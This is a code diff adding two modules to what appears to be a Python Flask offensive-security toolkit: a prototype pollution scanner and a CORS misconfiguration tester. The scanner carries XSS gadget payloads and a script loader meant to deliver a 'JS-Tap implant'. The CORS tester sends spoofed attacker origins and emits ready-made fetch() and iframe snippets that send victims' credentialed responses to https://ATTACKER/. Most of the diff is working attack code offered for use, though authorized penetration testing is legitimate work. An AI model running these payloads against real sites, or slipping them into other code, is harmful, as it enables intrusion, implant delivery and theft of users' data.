@@ -20990,6 +20990,543 @@ def auto_recon_route():
         return jsonify({"error": f"Server error: {e}"}), 500
 
 
+# ─────────────────────────────────────────────────────────
+#  PROTOTYPE POLLUTION SCANNER
+# ─────────────────────────────────────────────────────────
+class PrototypePollutionScanner:
+    """
+    Detect client-side and server-side prototype pollution, then attempt
+    to escalate to XSS via known gadget chains — optionally delivering
+    the JS-Tap implant on success.
+    """
+
+    # Known XSS escalation gadgets — CALLBACK is replaced with actual payload
+    XSS_GADGETS = [
+        {
+            "name":       "Generic innerHTML sink",
+            "params":     {"__proto__[innerHTML]": "<img src onerror=CALLBACK>"},
+            "type":       "DOM",
+            "frameworks": ["generic"],
+        },
+        {
+            "name":       "jQuery srcdoc gadget",
+            "params":     {"__proto__[src]": "1", "__proto__[srcdoc]": "<script>CALLBACK</script>"},
+            "type":       "jQuery",
+            "frameworks": ["jquery"],
+        },
+        {
+            "name":       "AngularJS template pollution",
+            "params":     {"__proto__[template]": "<img src onerror=CALLBACK>"},
+            "type":       "Angular",
+            "frameworks": ["angular"],
+        },
+        {
+            "name":       "Lodash merge innerHTML",
+            "params":     {"constructor[prototype][innerHTML]": "<img src onerror=CALLBACK>"},
+            "type":       "Lodash",
+            "frameworks": ["lodash"],
+        },
+        {
+            "name":       "constructor.prototype innerHTML",
+            "params":     {"constructor.prototype.innerHTML": "<img src onerror=CALLBACK>"},
+            "type":       "DOM",
+            "frameworks": ["generic"],
+        },
+        {
+            "name":       "Vue.js data pollution",
+            "params":     {"__proto__[data]": "CALLBACK"},
+            "type":       "Vue",
+            "frameworks": ["vue"],
+        },
+    ]
+
+    # Manual probe keys to test
+    _PROBE_KEYS = [
+        "__proto__[hxs_pp]",
+        "constructor.prototype.hxs_pp",
+        "constructor[prototype][hxs_pp]",
+    ]
+    _PROBE_VAL = "hxs_pp_probe_7331"
+
+    def _discover_urls(self, target: str, depth: int) -> List[str]:
+        """katana + waybackurls — return only URLs that have query parameters."""
+        urls: set = set()
+        try:
+            res = subprocess.run(
+                ["katana", "-u", target, "-d", str(depth), "-jc", "-silent"],
+                capture_output=True, text=True, timeout=120,
+            )
+            for line in res.stdout.splitlines():
+                line = line.strip()
+                if line and "?" in line:
+                    urls.add(line)
+        except FileNotFoundError:
+            logger.warning("PrototypePollution: katana not found")
+
+        try:
+            from urllib.parse import urlparse
+            domain = urlparse(target).netloc
+            res = subprocess.run(
+                ["waybackurls", domain],
+                capture_output=True, text=True, timeout=60,
+            )
+            for line in res.stdout.splitlines():
+                line = line.strip()
+                if line and "?" in line:
+                    urls.add(line)
+        except FileNotFoundError:
+            pass
+
+        return list(urls)
+
+    def _run_ppfuzz(self, urls: List[str]) -> List[Dict]:
+        findings: List[Dict] = []
+        if not urls:
+            return findings
+        tf_path: Optional[str] = None
+        try:
+            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tf:
+                for u in urls:
+                    tf.write(u + "\n")
+                tf_path = tf.name
+            res = subprocess.run(
+                ["ppfuzz", "-l", tf_path, "--silence"],
+                capture_output=True, text=True, timeout=300,
+            )
+            for line in (res.stdout + res.stderr).splitlines():
+                line = line.strip()
+                if "VULN" in line.upper() or "VULNERABLE" in line.upper() or "[PP]" in line:
+                    url_m = re.search(r"https?://\S+", line)
+                    findings.append({
+                        "url":      url_m.group(0).rstrip(").,") if url_m else "",
+                        "tool":     "ppfuzz",
+                        "raw":      line[:200],
+                        "severity": "HIGH",
+                    })
+        except FileNotFoundError:
+            logger.debug("ppfuzz not installed — skipping")
+        except Exception as e:
+            logger.warning(f"ppfuzz error: {e}")
+        finally:
+            if tf_path:
+                try:
+                    os.unlink(tf_path)
+                except Exception:
+                    pass
+        return findings
+
+    def _run_ppmap(self, target: str) -> List[Dict]:
+        findings: List[Dict] = []
+        try:
+            res = subprocess.run(
+                ["ppmap", "-u", target],
+                capture_output=True, text=True, timeout=120,
+            )
+            ansi_re = re.compile(r"\x1b\[[0-9;]*m")
+            for line in (res.stdout + res.stderr).splitlines():
+                clean = ansi_re.sub("", line).strip()
+                if "vulnerable" in clean.lower() or "[pp]" in clean.lower():
+                    url_m = re.search(r"https?://\S+", clean)
+                    findings.append({
+                        "url":      url_m.group(0).rstrip(").,") if url_m else target,
+                        "tool":     "ppmap",
+                        "raw":      clean[:200],
+                        "severity": "HIGH",
+                    })
+        except FileNotFoundError:
+            logger.debug("ppmap not installed — skipping")
+        return findings
+
+    def _manual_probe(self, urls: List[str]) -> List[Dict]:
+        """Inject __proto__[key]=val and check for reflection (server-side PP indicator)."""
+        findings: List[Dict] = []
+        for url in urls[:30]:
+            for probe_key in self._PROBE_KEYS:
+                try:
+                    sep      = "&" if "?" in url else "?"
+                    test_url = f"{url}{sep}{probe_key}={self._PROBE_VAL}"
+                    r = requests.get(test_url, timeout=8, verify=False,
+                                     headers={"User-Agent": "Mozilla/5.0"})
+                    if self._PROBE_VAL in r.text:
+                        findings.append({
+                            "url":      url,
+                            "payload":  f"{probe_key}={self._PROBE_VAL}",
+                            "tool":     "manual_probe",
+                            "type":     "server-side reflection",
+                            "severity": "HIGH",
+                            "evidence": f"Probe value reflected in HTTP response",
+                        })
+                        break
+                except Exception:
+                    pass
+        return findings
+
+    def _try_xss_escalation(self, vuln_urls: List[str], callback_url: str) -> List[Dict]:
+        """Try each gadget chain against vulnerable URLs."""
+        if not callback_url:
+            callback_url = "alert(document.domain)"
+
+        # If callback_url looks like a JS-Tap telemlib URL, wrap as a loader
+        if callback_url.endswith(".js") or "telemlib" in callback_url:
+            js_cb = (f"var s=document.createElement('script');"
+                     f"s.src='{callback_url}';"
+                     f"document.head.appendChild(s)")
+        else:
+            js_cb = callback_url
+
+        escalations: List[Dict] = []
+        for url in vuln_urls:
+            for gadget in self.XSS_GADGETS:
+                try:
+                    params    = {k: v.replace("CALLBACK", js_cb) for k, v in gadget["params"].items()}
+                    sep       = "&" if "?" in url else "?"
+                    param_str = "&".join(
+                        f"{requests.utils.quote(k)}={requests.utils.quote(v)}"
+                        for k, v in params.items()
+                    )
+                    test_url  = f"{url}{sep}{param_str}"
+                    r = requests.get(test_url, timeout=8, verify=False,
+                                     headers={"User-Agent": "Mozilla/5.0"})
+                    # Payload reflection in response body indicates potential XSS
+                    if any(list(v.values())[0][:30] in r.text for v in [params]):
+                        escalations.append({
+                            "url":         url,
+                            "gadget":      gadget["name"],
+                            "type":        gadget["type"],
+                            "frameworks":  gadget["frameworks"],
+                            "test_url":    test_url,
+                            "severity":    "CRITICAL",
+                            "description": (
+                                f"PP→XSS via {gadget['name']} gadget — "
+                                f"payload reflected in response"
+                            ),
+                        })
+                except Exception:
+                    pass
+        return escalations
+
+    def run(
+        self,
+        target: str,
+        depth: int = 3,
+        use_ppfuzz: bool = True,
+        use_ppmap: bool = True,
+        manual_probe: bool = True,
+        try_xss_escalation: bool = True,
+        callback_url: str = "",
+    ) -> Dict:
+        _start       = time.time()
+        all_findings: List[Dict] = []
+
+        urls = self._discover_urls(target, depth)
+        logger.info(f"PrototypePollution: {len(urls)} parameterized URLs on {target}")
+
+        if use_ppfuzz and urls:
+            all_findings.extend(self._run_ppfuzz(urls))
+
+        if use_ppmap:
+            all_findings.extend(self._run_ppmap(target))
+
+        if manual_probe and urls:
+            all_findings.extend(self._manual_probe(urls))
+
+        escalations: List[Dict] = []
+        if try_xss_escalation and all_findings:
+            vuln_urls = list({f.get("url", "") for f in all_findings if f.get("url")})
+            escalations = self._try_xss_escalation(vuln_urls, callback_url)
+
+        # Deduplicate
+        seen: set = set()
+        unique: List[Dict] = []
+        for f in all_findings:
+            key = (f.get("url", ""), str(f.get("payload", f.get("raw", "")))[:50])
+            if key not in seen:
+                seen.add(key)
+                unique.append(f)
+
+        sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
+        unique.sort(key=lambda x: sev_order.get(x.get("severity", "LOW"), 99))
+        escalations.sort(key=lambda x: sev_order.get(x.get("severity", "LOW"), 99))
+
+        return {
+            "target":          target,
+            "urls_tested":     len(urls),
+            "total_findings":  len(unique),
+            "high":            sum(1 for f in unique if f.get("severity") == "HIGH"),
+            "xss_escalations": len(escalations),
+            "critical":        len(escalations),
+            "findings":        unique,
+            "escalations":     escalations,
+            "duration_sec":    round(time.time() - _start, 2),
+        }
+
+
+pp_scanner = PrototypePollutionScanner()
+
+
+@app.route("/api/tools/pp/scan", methods=["POST"])
+def pp_scan_route():
+    try:
+        params = request.json or {}
+        result = pp_scanner.run(
+            target=params.get("target", ""),
+            depth=int(params.get("depth", 3)),
+            use_ppfuzz=bool(params.get("use_ppfuzz", True)),
+            use_ppmap=bool(params.get("use_ppmap", True)),
+            manual_probe=bool(params.get("manual_probe", True)),
+            try_xss_escalation=bool(params.get("try_xss_escalation", True)),
+            callback_url=params.get("callback_url", ""),
+        )
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 pp/scan error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+# ─────────────────────────────────────────────────────────
+#  CORS MISCONFIGURATION TESTER
+# ─────────────────────────────────────────────────────────
+class CORSTester:
+    """
+    Comprehensive CORS misconfiguration scanner.
+    Tests origin reflection, null origin, subdomain trust bypass,
+    prefix/suffix domain attacks, wildcard with credentials, and more.
+    Generates ready-to-use fetch() PoC snippets for each finding.
+    """
+
+    def _test_origin(self, url: str, origin: str) -> Dict:
+        headers = {
+            "Origin":     origin,
+            "User-Agent": "Mozilla/5.0",
+            "Cookie":     "session=test",   # simulate credentialed request
+        }
+        try:
+            r = requests.get(url, headers=headers, timeout=8, verify=False, allow_redirects=True)
+            acao = r.headers.get("Access-Control-Allow-Origin", "")
+            acac = r.headers.get("Access-Control-Allow-Credentials", "").lower()
+            acam = r.headers.get("Access-Control-Allow-Methods", "")
+            acah = r.headers.get("Access-Control-Allow-Headers", "")
+
+            reflected    = (acao == origin)
+            wildcard     = (acao == "*")
+            credentialed = (acac == "true")
+            exploitable  = (reflected and credentialed) or (origin == "null" and credentialed)
+
+            return {
+                "origin_sent":  origin,
+                "acao":         acao,
+                "acac":         acac,
+                "acam":         acam,
+                "acah":         acah,
+                "status_code":  r.status_code,
+                "reflected":    reflected,
+                "wildcard":     wildcard,
+                "credentialed": credentialed,
+                "exploitable":  exploitable,
+            }
+        except Exception as exc:
+            return {"origin_sent": origin, "error": str(exc), "exploitable": False}
+
+    def _generate_origins(self, target_url: str, custom_origins: List[str] = None) -> List[str]:
+        from urllib.parse import urlparse
+        parsed = urlparse(target_url)
+        domain = parsed.netloc.split(":")[0]
+        parts  = domain.split(".")
+        root   = ".".join(parts[-2:]) if len(parts) >= 2 else domain
+
+        origins = [
+            "https://evil.com",            # arbitrary
+            "null",                        # sandboxed iframe
+            f"http://{domain}",            # HTTP downgrade
+            f"https://evil.{root}",        # subdomain of target
+            f"https://{root}.evil.com",    # suffix bypass
+            f"https://evil{root}",         # prefix removal
+            f"https://evil_.{root}",       # underscore bypass
+            f"https://not{root}",          # similar domain
+            f"https://test.{root}",        # test subdomain (takeover target)
+            f"https://dev.{root}",         # dev subdomain
+            f"https://staging.{root}",     # staging subdomain
+            "https://localhost",
+            "http://localhost",
+            "https://127.0.0.1",
+        ]
+        if custom_origins:
+            origins.extend(custom_origins)
+        return origins
+
+    def _get_endpoints(self, target: str, crawl: bool, depth: int) -> List[str]:
+        from urllib.parse import urlparse
+        parsed = urlparse(target)
+        base   = f"{parsed.scheme}://{parsed.netloc}"
+
+        endpoints: set = {target}
+        # Common high-value API paths
+        for path in [
+            "/api/", "/api/v1/", "/api/v2/", "/api/v3/",
+            "/graphql", "/api/graphql",
+            "/api/user", "/api/me", "/api/profile",
+            "/api/account", "/api/admin",
+        ]:
+            endpoints.add(base + path)
+
+        if crawl:
+            try:
+                res = subprocess.run(
+                    ["katana", "-u", target, "-d", str(depth), "-silent"],
+                    capture_output=True, text=True, timeout=60,
+                )
+                for line in res.stdout.splitlines():
+                    line = line.strip()
+                    if line and line.startswith("http"):
+                        endpoints.add(line)
+            except FileNotFoundError:
+                pass
+
+        return list(endpoints)[:30]
+
+    def _classify(self, origin: str, res: Dict) -> tuple:
+        """Return (misconfig_type, severity, description, poc)"""
+        endpoint    = res.get("url", "")
+        credentialed = res.get("credentialed", False)
+
+        if origin == "null" and credentialed:
+            return (
+                "Null origin with credentials",
+                "CRITICAL",
+                "null origin is trusted with credentials — exploitable via sandboxed <iframe srcdoc>",
+                f"<iframe srcdoc=\"<script>fetch('{endpoint}',{{credentials:'include'}})"
+                f".then(r=>r.text()).then(d=>top.location='https://ATTACKER/?d='+btoa(d))</script>\">",
+            )
+        if res.get("reflected") and credentialed:
+            return (
+                "Origin reflection with credentials",
+                "CRITICAL",
+                f"Server reflects attacker-controlled origin '{origin}' with credentials — "
+                f"allows full cross-origin data theft",
+                f"fetch('{endpoint}',{{credentials:'include'}})"
+                f".then(r=>r.text()).then(d=>fetch('https://ATTACKER/?d='+btoa(d)))",
+            )
+        if res.get("wildcard") and credentialed:
+            return (
+                "Wildcard ACAO with credentials",
+                "HIGH",
+                "Access-Control-Allow-Origin: * with credentials=true (browsers block but server misconfigured)",
+                "",
+            )
+        if res.get("reflected") and not credentialed:
+            return (
+                "Origin reflection without credentials",
+                "MEDIUM",
+                f"Origin '{origin}' is reflected but credentials are not allowed — limited impact",
+                f"fetch('{endpoint}').then(r=>r.text()).then(d=>fetch('https://ATTACKER/?d='+btoa(d)))",
+            )
+        return ("", "", "", "")
+
+    def run(
+        self,
+        target: str,
+        crawl: bool = True,
+        depth: int = 2,
+        use_corsy: bool = False,
+        custom_origins: List[str] = None,
+    ) -> Dict:
+        _start    = time.time()
+        endpoints = self._get_endpoints(target, crawl, depth)
+        origins   = self._generate_origins(target, custom_origins)
+
+        logger.info(f"CORSTester: {len(endpoints)} endpoints × {len(origins)} origins")
+
+        all_findings: List[Dict] = []
+        seen_keys:    set = set()
+
+        for endpoint in endpoints:
+            for origin in origins:
+                res = self._test_origin(endpoint, origin)
+                res["url"] = endpoint
+
+                if res.get("exploitable") or (res.get("reflected") and not res.get("error")):
+                    misconfig_type, severity, description, poc = self._classify(origin, res)
+                    if not misconfig_type:
+                        continue
+                    key = (endpoint, origin)
+                    if key in seen_keys:
+                        continue
+                    seen_keys.add(key)
+                    all_findings.append({
+                        "endpoint":    endpoint,
+                        "origin":      origin,
+                        "acao":        res.get("acao", ""),
+                        "acac":        res.get("acac", ""),
+                        "acam":        res.get("acam", ""),
+                        "type":        misconfig_type,
+                        "severity":    severity,
+                        "description": description,
+                        "poc":         poc,
+                    })
+
+        # Optional: corsy
+        if use_corsy:
+            try:
+                res_c = subprocess.run(
+                    ["python3", "-m", "corsy", "-u", target, "--output", "json"],
+                    capture_output=True, text=True, timeout=60,
+                )
+                try:
+                    data = json.loads(res_c.stdout)
+                    for k, v in data.items():
+                        if isinstance(v, dict) and v.get("class"):
+                            all_findings.append({
+                                "endpoint":    target,
+                                "origin":      k,
+                                "acao":        v.get("acao", ""),
+                                "acac":        "",
+                                "type":        v.get("class", "CORS misconfiguration"),
+                                "severity":    "HIGH",
+                                "description": v.get("description", ""),
+                                "poc":         "",
+                                "tool":        "corsy",
+                            })
+                except Exception:
+                    pass
+            except FileNotFoundError:
+                logger.debug("corsy not installed — skipping")
+
+        sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
+        all_findings.sort(key=lambda x: sev_order.get(x.get("severity", "LOW"), 99))
+
+        return {
+            "target":           target,
+            "endpoints_tested": len(endpoints),
+            "origins_tested":   len(origins),
+            "total_findings":   len(all_findings),
+            "critical":         sum(1 for f in all_findings if f["severity"] == "CRITICAL"),
+            "high":             sum(1 for f in all_findings if f["severity"] == "HIGH"),
+            "medium":           sum(1 for f in all_findings if f["severity"] == "MEDIUM"),
+            "findings":         all_findings,
+            "duration_sec":     round(time.time() - _start, 2),
+        }
+
+
+cors_tester = CORSTester()
+
+
+@app.route("/api/tools/cors/test", methods=["POST"])
+def cors_test_route():
+    try:
+        params = request.json or {}
+        result = cors_tester.run(
+            target=params.get("target", ""),
+            crawl=bool(params.get("crawl", True)),
+            depth=int(params.get("depth", 2)),
+            use_corsy=bool(params.get("use_corsy", False)),
+            custom_origins=params.get("custom_origins"),
+        )
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 cors/test error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
 # Create the banner after all classes are defined
 BANNER = ModernVisualEngine.create_banner()
 
